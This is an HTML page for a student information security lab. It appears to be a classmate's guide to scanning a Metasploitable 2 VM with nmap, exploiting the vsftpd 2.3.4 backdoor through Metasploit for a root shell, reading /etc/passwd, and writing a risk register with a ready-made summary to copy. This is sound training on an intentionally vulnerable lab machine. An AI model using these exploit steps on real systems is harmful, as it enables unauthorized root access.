@@ -1,0 +1,1053 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>The Herta's Lab Guide — InfoSec Lab 01</title>
+<link href="https://fonts.googleapis.com/css2?family=Cinzel+Decorative:wght@400;700;900&family=Crimson+Pro:ital,wght@0,300;0,400;0,600;1,300;1,400&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0612;
+    --bg2: #100a1e;
+    --bg3: #150d28;
+    --purple-deep: #1a0a35;
+    --purple-mid: #4a1a8a;
+    --purple-bright: #8b3fd6;
+    --purple-light: #b87aff;
+    --purple-pale: #d4a8ff;
+    --gold: #e8c96a;
+    --gold-dim: #a8883a;
+    --white: #f0eaff;
+    --text: #c8b8e8;
+    --text-dim: #7a6a9a;
+    --glow: rgba(139, 63, 214, 0.4);
+    --glow-strong: rgba(139, 63, 214, 0.8);
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Crimson Pro', Georgia, serif;
+    font-size: 18px;
+    line-height: 1.7;
+    overflow-x: hidden;
+    cursor: none;
+  }
+
+  /* Custom cursor */
+  .cursor {
+    width: 12px; height: 12px;
+    background: var(--purple-light);
+    border-radius: 50%;
+    position: fixed;
+    pointer-events: none;
+    z-index: 9999;
+    transform: translate(-50%, -50%);
+    transition: transform 0.1s, background 0.2s;
+    box-shadow: 0 0 12px var(--glow-strong), 0 0 24px var(--glow);
+  }
+  .cursor-ring {
+    width: 32px; height: 32px;
+    border: 1px solid var(--purple-bright);
+    border-radius: 50%;
+    position: fixed;
+    pointer-events: none;
+    z-index: 9998;
+    transform: translate(-50%, -50%);
+    transition: transform 0.15s ease-out, border-color 0.2s;
+    opacity: 0.6;
+  }
+
+  /* Starfield background */
+  .stars {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    pointer-events: none;
+    z-index: 0;
+    overflow: hidden;
+  }
+  .star {
+    position: absolute;
+    background: white;
+    border-radius: 50%;
+    animation: twinkle var(--dur) ease-in-out infinite;
+    opacity: 0;
+  }
+  @keyframes twinkle {
+    0%, 100% { opacity: 0; transform: scale(0.5); }
+    50% { opacity: var(--op); transform: scale(1); }
+  }
+
+  /* Floating orbs */
+  .orb {
+    position: fixed;
+    border-radius: 50%;
+    filter: blur(80px);
+    pointer-events: none;
+    z-index: 0;
+    animation: orb-float 8s ease-in-out infinite;
+  }
+  .orb1 { width: 400px; height: 400px; background: rgba(74,26,138,0.3); top: -100px; right: -100px; animation-delay: 0s; }
+  .orb2 { width: 300px; height: 300px; background: rgba(139,63,214,0.15); bottom: 20%; left: -100px; animation-delay: -3s; }
+  .orb3 { width: 200px; height: 200px; background: rgba(184,122,255,0.1); top: 40%; right: 10%; animation-delay: -5s; }
+  @keyframes orb-float {
+    0%, 100% { transform: translateY(0px) scale(1); }
+    50% { transform: translateY(-30px) scale(1.05); }
+  }
+
+  /* Main layout */
+  .container {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 0 2rem;
+    position: relative;
+    z-index: 1;
+  }
+
+  /* Hero */
+  .hero {
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+    position: relative;
+    padding: 4rem 2rem;
+  }
+
+  .hero-eyebrow {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.75rem;
+    letter-spacing: 0.3em;
+    color: var(--purple-light);
+    text-transform: uppercase;
+    margin-bottom: 2rem;
+    opacity: 0;
+    animation: fade-up 0.8s 0.2s forwards;
+  }
+
+  .hero-title {
+    font-family: 'Cinzel Decorative', serif;
+    font-size: clamp(2rem, 6vw, 4.5rem);
+    font-weight: 900;
+    line-height: 1.1;
+    color: var(--white);
+    text-shadow: 0 0 40px var(--glow-strong), 0 0 80px var(--glow);
+    margin-bottom: 0.5rem;
+    opacity: 0;
+    animation: fade-up 0.8s 0.4s forwards;
+  }
+
+  .hero-title span {
+    background: linear-gradient(135deg, var(--purple-pale), var(--gold), var(--purple-light));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+
+  .hero-subtitle {
+    font-family: 'Cinzel Decorative', serif;
+    font-size: clamp(0.9rem, 2vw, 1.3rem);
+    color: var(--gold);
+    letter-spacing: 0.1em;
+    margin-bottom: 2rem;
+    opacity: 0;
+    animation: fade-up 0.8s 0.6s forwards;
+  }
+
+  .hero-quote {
+    font-style: italic;
+    font-size: 1.1rem;
+    color: var(--text-dim);
+    max-width: 500px;
+    border-left: 2px solid var(--purple-mid);
+    padding-left: 1.5rem;
+    margin: 2rem auto;
+    opacity: 0;
+    animation: fade-up 0.8s 0.8s forwards;
+  }
+
+  .hero-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 0.5rem;
+    background: rgba(139,63,214,0.15);
+    border: 1px solid var(--purple-mid);
+    border-radius: 2rem;
+    padding: 0.5rem 1.5rem;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.8rem;
+    color: var(--purple-pale);
+    margin-top: 1rem;
+    opacity: 0;
+    animation: fade-up 0.8s 1s forwards;
+  }
+
+  .hero-badge::before { content: '◆'; color: var(--gold); }
+
+  .scroll-hint {
+    position: absolute;
+    bottom: 2rem;
+    left: 50%;
+    transform: translateX(-50%);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 0.5rem;
+    color: var(--text-dim);
+    font-size: 0.75rem;
+    letter-spacing: 0.2em;
+    font-family: 'Share Tech Mono', monospace;
+    animation: bounce 2s ease-in-out infinite;
+    opacity: 0;
+    animation: fade-in 1s 1.5s forwards, bounce 2s 2.5s ease-in-out infinite;
+  }
+  .scroll-hint::after { content: '▼'; color: var(--purple-light); }
+
+  @keyframes bounce {
+    0%, 100% { transform: translateX(-50%) translateY(0); }
+    50% { transform: translateX(-50%) translateY(8px); }
+  }
+
+  /* Divider */
+  .divider {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    margin: 3rem 0;
+    color: var(--purple-mid);
+  }
+  .divider::before, .divider::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--purple-mid), transparent);
+  }
+  .divider-icon { color: var(--gold); font-size: 1.2rem; }
+
+  /* Steps */
+  .step-section {
+    padding: 2rem 0;
+    opacity: 0;
+    transform: translateY(30px);
+    transition: opacity 0.6s ease, transform 0.6s ease;
+  }
+  .step-section.visible {
+    opacity: 1;
+    transform: translateY(0);
+  }
+
+  .step-header {
+    display: flex;
+    align-items: flex-start;
+    gap: 1.5rem;
+    margin-bottom: 1.5rem;
+  }
+
+  .step-number {
+    font-family: 'Cinzel Decorative', serif;
+    font-size: 3rem;
+    font-weight: 900;
+    color: var(--purple-mid);
+    line-height: 1;
+    min-width: 60px;
+    text-shadow: 0 0 20px var(--glow);
+    flex-shrink: 0;
+  }
+
+  .step-title-block {}
+
+  .step-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.7rem;
+    letter-spacing: 0.25em;
+    color: var(--gold);
+    text-transform: uppercase;
+    margin-bottom: 0.25rem;
+  }
+
+  .step-title {
+    font-family: 'Cinzel Decorative', serif;
+    font-size: 1.3rem;
+    font-weight: 700;
+    color: var(--white);
+    text-shadow: 0 0 15px var(--glow);
+  }
+
+  .step-body {
+    padding-left: 4.5rem;
+  }
+
+  .step-body p {
+    color: var(--text);
+    margin-bottom: 1rem;
+    font-size: 1rem;
+  }
+
+  /* Cards */
+  .card {
+    background: linear-gradient(135deg, rgba(26,10,53,0.8), rgba(21,13,40,0.9));
+    border: 1px solid rgba(139,63,214,0.3);
+    border-radius: 12px;
+    padding: 1.5rem;
+    margin: 1rem 0;
+    position: relative;
+    overflow: hidden;
+    transition: border-color 0.3s, box-shadow 0.3s;
+  }
+  .card:hover {
+    border-color: var(--purple-bright);
+    box-shadow: 0 0 30px rgba(139,63,214,0.2), inset 0 0 30px rgba(139,63,214,0.05);
+  }
+  .card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0;
+    width: 3px; height: 100%;
+    background: linear-gradient(180deg, var(--gold), var(--purple-bright));
+  }
+
+  .card-title {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.75rem;
+    letter-spacing: 0.2em;
+    color: var(--gold);
+    text-transform: uppercase;
+    margin-bottom: 0.75rem;
+  }
+
+  /* Code blocks */
+  .code-block {
+    background: rgba(0,0,0,0.5);
+    border: 1px solid rgba(139,63,214,0.2);
+    border-radius: 8px;
+    padding: 1.25rem 1.5rem;
+    margin: 0.75rem 0;
+    position: relative;
+    overflow-x: auto;
+  }
+  .code-block::before {
+    content: attr(data-label);
+    position: absolute;
+    top: -1px; right: 1rem;
+    background: var(--purple-mid);
+    color: var(--white);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.65rem;
+    letter-spacing: 0.15em;
+    padding: 0.2rem 0.75rem;
+    border-radius: 0 0 6px 6px;
+  }
+  code {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.88rem;
+    color: var(--purple-pale);
+    display: block;
+    white-space: pre;
+  }
+  code .comment { color: var(--text-dim); font-style: italic; }
+  code .cmd { color: var(--gold); }
+  code .flag { color: #7af0b0; }
+  code .ip { color: #f07a9a; }
+  code .output { color: var(--text-dim); }
+
+  /* Warning/note boxes */
+  .note-box {
+    background: rgba(232,201,106,0.05);
+    border: 1px solid rgba(232,201,106,0.3);
+    border-radius: 8px;
+    padding: 1rem 1.25rem;
+    margin: 1rem 0;
+    display: flex;
+    gap: 0.75rem;
+    align-items: flex-start;
+  }
+  .note-box .icon { color: var(--gold); flex-shrink: 0; font-size: 1.1rem; }
+  .note-box p { font-size: 0.95rem; color: #c8b060; margin: 0; }
+
+  .warning-box {
+    background: rgba(214,63,63,0.05);
+    border: 1px solid rgba(214,63,63,0.3);
+    border-radius: 8px;
+    padding: 1rem 1.25rem;
+    margin: 1rem 0;
+    display: flex;
+    gap: 0.75rem;
+    align-items: flex-start;
+  }
+  .warning-box .icon { color: #f07a7a; flex-shrink: 0; }
+  .warning-box p { font-size: 0.95rem; color: #c87070; margin: 0; }
+
+  .success-box {
+    background: rgba(63,214,120,0.05);
+    border: 1px solid rgba(63,214,120,0.3);
+    border-radius: 8px;
+    padding: 1rem 1.25rem;
+    margin: 1rem 0;
+    display: flex;
+    gap: 0.75rem;
+  }
+  .success-box .icon { color: #7af0b0; flex-shrink: 0; }
+  .success-box p { font-size: 0.95rem; color: #70c890; margin: 0; }
+
+  /* List styles */
+  .herta-list {
+    list-style: none;
+    padding: 0;
+    margin: 0.75rem 0;
+  }
+  .herta-list li {
+    padding: 0.4rem 0 0.4rem 1.75rem;
+    position: relative;
+    font-size: 1rem;
+    color: var(--text);
+  }
+  .herta-list li::before {
+    content: '◆';
+    position: absolute;
+    left: 0;
+    color: var(--purple-bright);
+    font-size: 0.6rem;
+    top: 0.65rem;
+  }
+
+  /* Credentials display */
+  .cred-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 1rem;
+    margin: 1rem 0;
+  }
+  .cred-item {
+    background: rgba(0,0,0,0.4);
+    border: 1px solid rgba(139,63,214,0.2);
+    border-radius: 8px;
+    padding: 1rem;
+    text-align: center;
+  }
+  .cred-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.65rem;
+    letter-spacing: 0.2em;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    margin-bottom: 0.5rem;
+  }
+  .cred-value {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 1.2rem;
+    color: var(--gold);
+    text-shadow: 0 0 10px rgba(232,201,106,0.5);
+  }
+
+  /* Progress tracker */
+  .progress-bar {
+    position: fixed;
+    top: 0; left: 0;
+    height: 2px;
+    background: linear-gradient(90deg, var(--purple-bright), var(--gold));
+    z-index: 1000;
+    transition: width 0.1s;
+    box-shadow: 0 0 8px var(--purple-bright);
+  }
+
+  /* Nav dots */
+  .nav-dots {
+    position: fixed;
+    right: 2rem;
+    top: 50%;
+    transform: translateY(-50%);
+    display: flex;
+    flex-direction: column;
+    gap: 0.75rem;
+    z-index: 100;
+  }
+  .nav-dot {
+    width: 6px; height: 6px;
+    border-radius: 50%;
+    background: var(--purple-mid);
+    cursor: pointer;
+    transition: all 0.3s;
+    position: relative;
+  }
+  .nav-dot.active, .nav-dot:hover {
+    background: var(--purple-light);
+    box-shadow: 0 0 8px var(--glow-strong);
+    transform: scale(1.5);
+  }
+  .nav-dot::after {
+    content: attr(data-label);
+    position: absolute;
+    right: 1.5rem;
+    top: 50%;
+    transform: translateY(-50%);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.65rem;
+    color: var(--purple-pale);
+    white-space: nowrap;
+    opacity: 0;
+    transition: opacity 0.2s;
+    pointer-events: none;
+  }
+  .nav-dot:hover::after { opacity: 1; }
+
+  /* Section wrapper */
+  .section {
+    padding: 4rem 0;
+    position: relative;
+    z-index: 1;
+  }
+
+  .section-tag {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.7rem;
+    letter-spacing: 0.3em;
+    color: var(--purple-light);
+    text-transform: uppercase;
+    margin-bottom: 0.5rem;
+    display: block;
+  }
+
+  .section-title {
+    font-family: 'Cinzel Decorative', serif;
+    font-size: clamp(1.5rem, 3vw, 2.2rem);
+    color: var(--white);
+    margin-bottom: 0.5rem;
+    text-shadow: 0 0 20px var(--glow);
+  }
+
+  .section-title span { color: var(--gold); }
+
+  /* Footer */
+  footer {
+    text-align: center;
+    padding: 4rem 2rem;
+    position: relative;
+    z-index: 1;
+    border-top: 1px solid rgba(139,63,214,0.2);
+  }
+  footer .footer-title {
+    font-family: 'Cinzel Decorative', serif;
+    font-size: 1.5rem;
+    color: var(--purple-pale);
+    margin-bottom: 0.5rem;
+    text-shadow: 0 0 20px var(--glow);
+  }
+  footer p {
+    color: var(--text-dim);
+    font-size: 0.9rem;
+    font-style: italic;
+  }
+  footer .heart { color: var(--purple-bright); }
+
+  /* Animations */
+  @keyframes fade-up {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+  @keyframes fade-in {
+    from { opacity: 0; }
+    to { opacity: 1; }
+  }
+
+  /* Responsive */
+  @media (max-width: 600px) {
+    .step-body { padding-left: 0; margin-top: 1rem; }
+    .cred-grid { grid-template-columns: 1fr; }
+    .nav-dots { display: none; }
+    code { font-size: 0.78rem; }
+  }
+</style>
+</head>
+<body>
+
+<div class="cursor" id="cursor"></div>
+<div class="cursor-ring" id="cursorRing"></div>
+<div class="progress-bar" id="progressBar"></div>
+<div class="stars" id="stars"></div>
+<div class="orb orb1"></div>
+<div class="orb orb2"></div>
+<div class="orb orb3"></div>
+
+<nav class="nav-dots" id="navDots"></nav>
+
+<!-- HERO -->
+<section class="hero" id="sec-hero">
+  <div class="container">
+    <p class="hero-eyebrow">Information Security — Laboratory Activity No. 9</p>
+    <h1 class="hero-title"><span>Ishi x Herta's</span><br>Lab Guide</h1>
+    <p class="hero-subtitle">Network Reconnaissance, Exploitation & Risk Assessment</p>
+    <blockquote class="hero-quote">
+      "Truly a THerta simp. AI OFC CUZ PEAK WEB DESIGN"
+    </blockquote>
+    <div class="hero-badge">Kali Linux + Metasploitable 2 + VirtualBox</div>
+  </div>
+  <div class="scroll-hint">scroll</div>
+</section>
+
+<!-- SETUP -->
+<section class="section" id="sec-setup">
+  <div class="container">
+    <span class="section-tag">Prerequisites</span>
+    <h2 class="section-title">Before You <span>Begin</span></h2>
+
+    <div class="divider"><span class="divider-icon">✦</span></div>
+
+    <!-- Step 1 -->
+    <div class="step-section" data-step="1">
+      <div class="step-header">
+        <div class="step-number">01</div>
+        <div class="step-title-block">
+          <div class="step-label">Download</div>
+          <div class="step-title">Get Metasploitable 2</div>
+        </div>
+      </div>
+      <div class="step-body">
+        <p>If you haven't downloaded it yet, grab it from SourceForge:</p>
+        <div class="card">
+          <div class="card-title">Download Link</div>
+          <p style="font-family:'Share Tech Mono',monospace; color:var(--purple-pale); word-break:break-all;">https://sourceforge.net/projects/metasploitable/</p>
+        </div>
+        <p>Once downloaded, <strong style="color:var(--white);">right click the zip → Extract All.</strong> You'll get a folder called <code style="display:inline; white-space:normal; font-size:0.85rem; background:rgba(0,0,0,0.3); padding:0.1rem 0.4rem; border-radius:4px;">Metasploitable2-Linux</code> with the VM files inside.</p>
+      </div>
+    </div>
+
+    <div class="divider"><span class="divider-icon">✦</span></div>
+
+    <!-- Step 2 -->
+    <div class="step-section" data-step="2">
+      <div class="step-header">
+        <div class="step-number">02</div>
+        <div class="step-title-block">
+          <div class="step-label">VirtualBox</div>
+          <div class="step-title">Create the Metasploitable 2 VM</div>
+        </div>
+      </div>
+      <div class="step-body">
+        <p>Open VirtualBox and click <strong style="color:var(--white);">New</strong>, then fill in the following:</p>
+        <div class="card">
+          <div class="card-title">VM Settings</div>
+          <ul class="herta-list">
+            <li><strong style="color:var(--gold);">Name:</strong> Metasploitable2</li>
+            <li><strong style="color:var(--gold);">Type:</strong> Linux</li>
+            <li><strong style="color:var(--gold);">Version:</strong> Ubuntu (32-bit)</li>
+            <li><strong style="color:var(--gold);">Memory:</strong> 512 MB</li>
+            <li><strong style="color:var(--gold);">CPU:</strong> 1</li>
+          </ul>
+        </div>
+        <div class="warning-box">
+          <span class="icon">⚠</span>
+          <p><strong>Hard Disk:</strong> Select <em>"Use an Existing Virtual Hard Disk File"</em> — do NOT create a new one. Click the folder icon 📁, navigate to your extracted folder, and select the <strong>Metasploitable</strong> file (the big ~1.8GB one). That's the .vmdk disk.</p>
+        </div>
+        <p>Click <strong style="color:var(--white);">Finish</strong> and the VM will appear in your list.</p>
+      </div>
+    </div>
+
+    <div class="divider"><span class="divider-icon">✦</span></div>
+
+    <!-- Step 3 -->
+    <div class="step-section" data-step="3">
+      <div class="step-header">
+        <div class="step-number">03</div>
+        <div class="step-title-block">
+          <div class="step-label">Network</div>
+          <div class="step-title">Set Both VMs to Host-Only</div>
+        </div>
+      </div>
+      <div class="step-body">
+        <p>Do this for <strong style="color:var(--white);">both Kali and Metasploitable2:</strong></p>
+        <ul class="herta-list">
+          <li>Select the VM → <strong style="color:var(--gold);">Settings → Network</strong></li>
+          <li>Change <strong style="color:var(--gold);">"Attached to"</strong> → <strong style="color:var(--purple-pale);">Host-Only Adapter</strong></li>
+          <li>Click <strong style="color:var(--gold);">OK</strong></li>
+        </ul>
+        <div class="note-box">
+          <span class="icon">✦</span>
+          <p>This keeps ALL traffic inside your computer. Nothing goes through your WiFi.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="divider"><span class="divider-icon">✦</span></div>
+
+    <!-- Step 4 -->
+    <div class="step-section" data-step="4">
+      <div class="step-header">
+        <div class="step-number">04</div>
+        <div class="step-title-block">
+          <div class="step-label">Boot Up</div>
+          <div class="step-title">Start Both VMs & Get IPs</div>
+        </div>
+      </div>
+      <div class="step-body">
+        <p>Start both VMs, then log in with these credentials:</p>
+        <div class="cred-grid">
+          <div class="cred-item">
+            <div class="cred-label">Metasploitable 2</div>
+            <div class="cred-value">msfadmin / msfadmin</div>
+          </div>
+          <div class="cred-item">
+            <div class="cred-label">Kali Linux</div>
+            <div class="cred-value">kali / kali</div>
+          </div>
+        </div>
+        <p>On <strong style="color:var(--gold);">Metasploitable2</strong> terminal, run:</p>
+        <div class="code-block" data-label="METASPLOITABLE">
+<code><span class="cmd">ifconfig</span>
+<span class="output"># Look for inet addr — note the IP (e.g. 192.168.56.101)</span></code>
+        </div>
+        <p>On <strong style="color:var(--gold);">Kali</strong> terminal, run:</p>
+        <div class="code-block" data-label="KALI">
+<code><span class="cmd">ip a</span>
+<span class="output"># Look for inet under eth0 (e.g. 192.168.56.102)</span></code>
+        </div>
+        <p>Then test the connection from Kali:</p>
+        <div class="code-block" data-label="KALI">
+<code><span class="cmd">ping</span> <span class="flag">-c 4</span> <span class="ip">192.168.56.101</span></code>
+        </div>
+        <div class="success-box">
+          <span class="icon">✓</span>
+          <p>You should see <strong>4 packets transmitted, 4 received, 0% packet loss.</strong> If so, you're ready to proceed!</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- PART A -->
+<section class="section" id="sec-parta">
+  <div class="container">
+    <span class="section-tag">Part A</span>
+    <h2 class="section-title">Nmap <span>Reconnaissance</span></h2>
+    <div class="divider"><span class="divider-icon">✦</span></div>
+
+    <div class="step-section">
+      <p style="margin-bottom:1.5rem; color:var(--text);">Run all four scans from your Kali terminal. Replace <code style="display:inline;font-size:0.85rem;background:rgba(0,0,0,0.3);padding:0.1rem 0.4rem;border-radius:4px;color:var(--purple-pale);">192.168.56.101</code> with your actual Metasploitable IP if different.</p>
+
+      <div class="card">
+        <div class="card-title">Scan 1 — Basic Port Scan</div>
+        <div class="code-block" data-label="KALI">
+<code><span class="cmd">nmap</span> <span class="ip">192.168.56.101</span></code>
+        </div>
+        <p style="font-size:0.95rem; color:var(--text-dim);">Shows all open ports and services. No version info yet.</p>
+      </div>
+
+      <div class="card">
+        <div class="card-title">Scan 2 — Version Detection</div>
+        <div class="code-block" data-label="KALI">
+<code><span class="cmd">nmap</span> <span class="flag">-sV</span> <span class="ip">192.168.56.101</span></code>
+        </div>
+        <p style="font-size:0.95rem; color:var(--text-dim);">Reveals exact service versions — critical for finding CVEs.</p>
+      </div>
+
+      <div class="card">
+        <div class="card-title">Scan 3 — OS Detection</div>
+        <div class="code-block" data-label="KALI">
+<code><span class="cmd">sudo nmap</span> <span class="flag">-O</span> <span class="ip">192.168.56.101</span></code>
+        </div>
+        <p style="font-size:0.95rem; color:var(--text-dim);">Fingerprints the target OS. Note: capital O, not zero!</p>
+      </div>
+
+      <div class="card">
+        <div class="card-title">Scan 4 — Combined Scan + Save to File</div>
+        <div class="code-block" data-label="KALI">
+<code><span class="cmd">sudo nmap</span> <span class="flag">-sV -O</span> <span class="flag">-oN</span> nmap_scan_results.txt <span class="ip">192.168.56.101</span></code>
+        </div>
+        <p style="font-size:0.95rem; color:var(--text-dim);">Saves everything to a file. View it with:</p>
+        <div class="code-block" data-label="KALI">
+<code><span class="cmd">cat</span> nmap_scan_results.txt</code>
+        </div>
+      </div>
+
+      <div class="note-box">
+        <span class="icon">✦</span>
+        <p>Use your Scan 2 and 4 results to fill in the <strong>Observation Table</strong>. For the CVE column, Google each service version (e.g. "vsftpd 2.3.4 CVE") on nvd.nist.gov.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- PART B -->
+<section class="section" id="sec-partb">
+  <div class="container">
+    <span class="section-tag">Part B</span>
+    <h2 class="section-title">Metasploit <span>Exploitation</span></h2>
+    <div class="divider"><span class="divider-icon">✦</span></div>
+
+    <div class="step-section">
+      <p style="margin-bottom:1.5rem;">You'll be exploiting <strong style="color:var(--white);">CVE-2011-2523</strong> — a backdoor in vsftpd 2.3.4 that grants root access when triggered.</p>
+
+      <div class="card">
+        <div class="card-title">Step 1 — Launch Metasploit</div>
+        <div class="code-block" data-label="KALI">
+<code><span class="cmd">msfconsole</span></code>
+        </div>
+        <p style="font-size:0.95rem; color:var(--text-dim);">Wait ~30 seconds for it to load. You'll see the msf6 &gt; prompt.</p>
+      </div>
+
+      <div class="card">
+        <div class="card-title">Steps 2–5 — Search, Load, Configure, Run</div>
+        <div class="code-block" data-label="MSFCONSOLE">
+<code><span class="comment"># Search for the exploit</span>
+<span class="cmd">search</span> vsftpd
+
+<span class="comment"># Load it</span>
+<span class="cmd">use</span> exploit/unix/ftp/vsftpd_234_backdoor
+
+<span class="comment"># Set the target IP</span>
+<span class="cmd">set</span> RHOSTS <span class="ip">192.168.56.101</span>
+
+<span class="comment"># Run it!</span>
+<span class="cmd">run</span></code>
+        </div>
+      </div>
+
+      <div class="success-box">
+        <span class="icon">✓</span>
+        <p>Success looks like: <em>"Command shell session 1 opened"</em> followed by a blank line. That blank line IS your shell — you're now inside Metasploitable as root!</p>
+      </div>
+
+      <div class="card">
+        <div class="card-title">Step 6 — Collect Evidence (run these in the shell)</div>
+        <div class="code-block" data-label="TARGET SHELL">
+<code><span class="cmd">id</span>
+<span class="cmd">whoami</span>
+<span class="cmd">hostname</span>
+<span class="cmd">uname -a</span>
+<span class="cmd">cat</span> /etc/passwd | head -5</code>
+        </div>
+        <p style="font-size:0.95rem; color:var(--text-dim);">Screenshot or copy all outputs — you'll need them for the observation table.</p>
+      </div>
+
+      <div class="card">
+        <div class="card-title">Step 7 — Exit Cleanly</div>
+        <div class="code-block" data-label="EXIT">
+<code><span class="cmd">exit</span>   <span class="comment"># exits the target shell</span>
+<span class="cmd">exit</span>   <span class="comment"># exits msfconsole</span></code>
+        </div>
+      </div>
+
+      <div class="warning-box">
+        <span class="icon">⚠</span>
+        <p>If the exploit fails with "no session created", wait 30 seconds and type <strong>run</strong> again. The backdoor port occasionally needs a moment to reset.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- PART C -->
+<section class="section" id="sec-partc">
+  <div class="container">
+    <span class="section-tag">Part C</span>
+    <h2 class="section-title">Risk <span>Assessment</span></h2>
+    <div class="divider"><span class="divider-icon">✦</span></div>
+
+    <div class="step-section">
+      <p style="margin-bottom:1.5rem;">Use the <strong style="color:var(--white);">Risk Score = Likelihood × Impact</strong> formula. Here are your 5 risks to fill in:</p>
+
+      <div class="card">
+        <div class="card-title">Risk Register — 5 Required Entries</div>
+        <div style="overflow-x:auto;">
+          <table style="width:100%; border-collapse:collapse; font-size:0.88rem; font-family:'Share Tech Mono',monospace;">
+            <thead>
+              <tr style="color:var(--gold); border-bottom:1px solid rgba(139,63,214,0.3);">
+                <th style="padding:0.6rem; text-align:left;">Asset</th>
+                <th style="padding:0.6rem; text-align:left;">Vulnerability / CVE</th>
+                <th style="padding:0.6rem; text-align:center;">L</th>
+                <th style="padding:0.6rem; text-align:center;">I</th>
+                <th style="padding:0.6rem; text-align:center;">Score</th>
+                <th style="padding:0.6rem; text-align:left;">Level</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr style="border-bottom:1px solid rgba(139,63,214,0.15); color:var(--text);">
+                <td style="padding:0.6rem;">FTP (Port 21)</td>
+                <td style="padding:0.6rem; color:var(--purple-pale);">vsftpd 2.3.4 — CVE-2011-2523</td>
+                <td style="padding:0.6rem; text-align:center; color:var(--gold);">3</td>
+                <td style="padding:0.6rem; text-align:center; color:var(--gold);">3</td>
+                <td style="padding:0.6rem; text-align:center; color:var(--gold);">9</td>
+                <td style="padding:0.6rem; color:#f07a7a;">CRITICAL</td>
+              </tr>
+              <tr style="border-bottom:1px solid rgba(139,63,214,0.15); color:var(--text);">
+                <td style="padding:0.6rem;">Telnet (Port 23)</td>
+                <td style="padding:0.6rem; color:var(--purple-pale);">Cleartext credentials, no encryption</td>
+                <td style="padding:0.6rem; text-align:center; color:var(--gold);">3</td>
+                <td style="padding:0.6rem; text-align:center; color:var(--gold);">3</td>
+                <td style="padding:0.6rem; text-align:center; color:var(--gold);">9</td>
+                <td style="padding:0.6rem; color:#f07a7a;">CRITICAL</td>
+              </tr>
+              <tr style="border-bottom:1px solid rgba(139,63,214,0.15); color:var(--text);">
+                <td style="padding:0.6rem;">Samba (Port 445)</td>
+                <td style="padding:0.6rem; color:var(--purple-pale);">CVE-2007-2447 — RCE</td>
+                <td style="padding:0.6rem; text-align:center; color:var(--gold);">3</td>
+                <td style="padding:0.6rem; text-align:center; color:var(--gold);">3</td>
+                <td style="padding:0.6rem; text-align:center; color:var(--gold);">9</td>
+                <td style="padding:0.6rem; color:#f07a7a;">CRITICAL</td>
+              </tr>
+              <tr style="border-bottom:1px solid rgba(139,63,214,0.15); color:var(--text);">
+                <td style="padding:0.6rem;">MySQL (Port 3306)</td>
+                <td style="padding:0.6rem; color:var(--purple-pale);">Exposed on network, no firewall</td>
+                <td style="padding:0.6rem; text-align:center; color:var(--gold);">2</td>
+                <td style="padding:0.6rem; text-align:center; color:var(--gold);">3</td>
+                <td style="padding:0.6rem; text-align:center; color:var(--gold);">6</td>
+                <td style="padding:0.6rem; color:#f0b07a;">HIGH</td>
+              </tr>
+              <tr style="color:var(--text);">
+                <td style="padding:0.6rem;">SSH (Port 22)</td>
+                <td style="padding:0.6rem; color:var(--purple-pale);">OpenSSH 4.7p1 — CVE-2008-0166</td>
+                <td style="padding:0.6rem; text-align:center; color:var(--gold);">2</td>
+                <td style="padding:0.6rem; text-align:center; color:var(--gold);">2</td>
+                <td style="padding:0.6rem; text-align:center; color:var(--gold);">4</td>
+                <td style="padding:0.6rem; color:#f0e07a;">MEDIUM</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="card" style="margin-top:1.5rem;">
+        <div class="card-title">Executive Summary (copy & modify in your own words)</div>
+        <p style="font-style:italic; color:var(--text); font-size:1rem; line-height:1.8;">"During the security assessment of the target machine, we found 23 open ports running various outdated services that pose serious security risks. The biggest issue we discovered was vsftpd 2.3.4 running on port 21, which has a known backdoor (CVE-2011-2523) that gave us full root access to the system without needing any password. On top of that, services like Telnet and Samba are also running, which are known to be insecure and easily exploitable. Based on these findings, the server is in a very poor security state and should immediately have its outdated software updated, unused ports closed, and a firewall configured to limit exposure to potential attackers."</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- REFLECTION -->
+<section class="section" id="sec-reflect">
+  <div class="container">
+    <span class="section-tag">Part D</span>
+    <h2 class="section-title">Reflection <span>Questions</span></h2>
+    <div class="divider"><span class="divider-icon">✦</span></div>
+
+    <div class="step-section">
+
+      <div class="card">
+        <div class="card-title">FEEL FREE TO MODIFY ALL OF EM</div>
+      </div>
